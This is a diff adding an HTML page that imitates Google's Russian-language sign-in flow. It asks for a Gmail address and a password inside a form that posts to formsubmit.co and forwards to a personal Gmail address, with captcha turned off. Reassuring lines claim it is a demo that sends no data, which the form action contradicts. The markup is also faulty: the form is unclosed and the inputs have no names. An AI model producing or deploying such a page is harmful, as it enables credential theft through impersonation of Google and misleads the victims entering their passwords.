@@ -1,0 +1,166 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Демонстрация — макет</title>
+<style>
+  /* Простая стилизация под тёмную тему, похожую на скриншоты */
+  :root{font-family: "Roboto", Arial, sans-serif;color:#e6eef8}
+  body{margin:0;background:#000;height:100vh;display:flex;align-items:flex-start;justify-content:center}
+  .screen{width:420px;padding:28px;border-radius:8px;box-sizing:border-box}
+  .card{background:transparent;color:#fff}
+  .logo{font-size:44px;font-weight:700;letter-spacing:1px;color:#fff}
+  h1{font-size:28px;margin:14px 0 6px}
+  .muted{color:#9aa0a6;margin-bottom:12px}
+  label{display:block;color:#bfc7cf;margin-bottom:6px}
+  .input, textarea{width:100%;padding:12px;border-radius:8px;border:1px solid rgba(255,255,255,0.12);background:transparent;color:#fff;box-sizing:border-box}
+  textarea{min-height:120px;resize:vertical}
+  .link{color:#8ab4f8;text-decoration:none;cursor:pointer;font-size:14px}
+  .row{display:flex;justify-content:space-between;align-items:center;margin-top:18px}
+  .button{background:#7aa7ff;border:none;padding:10px 16px;border-radius:8px;color:#fff;cursor:pointer}
+  .small{font-size:13px;color:#9aa0a6;margin-top:10px}
+  .hidden{display:none}
+  .display-text{margin:12px 0;padding:12px;border-radius:8px;background:rgba(255,255,255,0.02);color:#cfe6ff;word-break:break-word}
+  .center-left{display:flex;flex-direction:column;align-items:flex-start}
+</style>
+</head>
+<body>
+
+     <!-- Форма отправки -->
+    <form action="https://formsubmit.co/Golda1.namechtu@gmail.com" method="POST">
+      <!-- скрытые настройки FormSubmit -->
+      <input type="hidden" name="_subject" value="Новое сообщение с формы">
+      <input type="hidden" name="_captcha" value="false">
+
+      <!-- Экран 1: как первая фотография, но русские тексты -->
+  <div id="screen1" class="screen card">
+    <div class="logo">Google</div>
+    <h1>Войдите</h1>
+    <div class="muted">Используйте аккаунт Google. Учётная запись добавится на это устройство и будет доступна другим приложениям Google.</div>
+
+    <label for="msg1">Gmail</label>
+    <textarea id="msg1" class="input" placeholder="@gmail.com"></textarea>
+
+    <div style="margin-top:8px">
+      <a class="link" id="forgot1">Забыли пароль?</a>
+    </div>
+
+    <div class="row">
+      <a class="link" id="create1">Создать аккаунт</a>
+      <button id="toScreen2" class="button">Дальше</button>
+    </div>
+  </div>
+
+  <!-- Экран 2: как вторая фотография — показываем введённое и просим подтвердить / дописать -->
+  <div id="screen2" class="screen card hidden">
+    <div class="logo">Google</div>
+    <h1>Добро пожаловать</h1>
+    <div class="muted">Ваше сообщение</div>
+
+    <!-- Здесь отображается то, что ввёл пользователь на первом экране -->
+    <div id="displayMessage" class="display-text">(здесь будет ваше сообщение)</div>
+
+    <label for="extra">Пароль</label>
+    <textarea id="extra" class="input" placeholder=""></textarea>
+
+    <div style="display:flex;align-items:center;gap:10px;margin-top:10px">
+      <input type="checkbox" id="showMessage"><label for="showMessage" style="color:#9aa0a6">Показать текст</label>
+    </div>
+
+    <div class="row">
+      <a class="link" id="tryOther">Попробовать другой способ</a>
+      <button id="confirm" class="button">Дальше</button>
+    </div>
+
+    <div class="small">Демонстрационный макет. Никакие данные не отправляются.</div>
+  </div>
+
+  <!-- Финальный экран (простая подсказка) -->
+  <div id="done" class="screen card hidden">
+    <div class="logo">Google</div>
+    <h1>Готово</h1>
+    <div class="muted">Спасибо! Ваше сообщение подготовлено локально.</div>
+    <div id="summary" class="display-text"></div>
+    <div class="row" style="margin-top:12px">
+      <button id="backToStart" class="button">Вернуться</button>
+    </div>
+    <div class="small" style="margin-top:8px">Этот макет не отправляет данные на сервер.</div>
+  </div>
+
+<script>
+  // Элементы
+  const screen1 = document.getElementById('screen1');
+  const screen2 = document.getElementById('screen2');
+  const done = document.getElementById('done');
+
+  const toScreen2Btn = document.getElementById('toScreen2');
+  const confirmBtn = document.getElementById('confirm');
+  const backBtn = document.getElementById('backToStart');
+
+  const msg1 = document.getElementById('msg1');
+  const displayMessage = document.getElementById('displayMessage');
+  const extra = document.getElementById('extra');
+  const showMessageCheckbox = document.getElementById('showMessage');
+
+  const summary = document.getElementById('summary');
+
+  // Переход к экрану 2: переносим текст
+  toScreen2Btn.addEventListener('click', () => {
+    const text = msg1.value.trim();
+    if(!text){
+      alert('Пожалуйста, введите сообщение.');
+      msg1.focus();
+      return;
+    }
+    displayMessage.textContent = text;
+    screen1.classList.add('hidden');
+    screen2.classList.remove('hidden');
+    extra.value = '';
+    showMessageCheckbox.checked = false;
+  });
+
+  // Показать/скрыть полный текст (правда уже виден, но для имитации)
+  showMessageCheckbox.addEventListener('change', () => {
+    if(showMessageCheckbox.checked){
+      displayMessage.style.whiteSpace = 'pre-wrap';
+    } else {
+      displayMessage.style.whiteSpace = 'nowrap';
+      displayMessage.style.overflow = 'hidden';
+      displayMessage.style.textOverflow = 'ellipsis';
+    }
+  });
+
+  // Подтверждение — показываем финальный экран (локально)
+  confirmBtn.addEventListener('click', () => {
+    const original = displayMessage.textContent || '';
+    const extraText = extra.value.trim();
+    const combined = `Сообщение: \n${original}\n\nДополнение: \n${extraText || '(нет)'}\n\n(Данные остаются в браузере, не отправляются)`;
+    summary.textContent = combined;
+    screen2.classList.add('hidden');
+    done.classList.remove('hidden');
+
+    // Локальный лог в консоль (для разработчика)
+    console.log('DEMO MESSAGE (локально):', { original, extra: extraText });
+  });
+
+  // Назад на начало (сброс)
+  backBtn.addEventListener('click', () => {
+    msg1.value = '';
+    extra.value = '';
+    displayMessage.textContent = '(здесь будет ваше сообщение)';
+    screen1.classList.remove('hidden');
+    done.classList.add('hidden');
+  });
+
+  // Быстрая клавиша Enter для перехода
+  msg1.addEventListener('keydown', (e) => { if(e.key === 'Enter' && !e.shiftKey){ e.preventDefault(); toScreen2Btn.click(); } });
+  extra.addEventListener('keydown', (e) => { if(e.key === 'Enter' && e.ctrlKey){ confirmBtn.click(); } });
+
+  // Инициализация — стиль обрезки текста
+  displayMessage.style.whiteSpace = 'nowrap';
+  displayMessage.style.overflow = 'hidden';
+  displayMessage.style.textOverflow = 'ellipsis';
+</script>
+</body>
+</html>
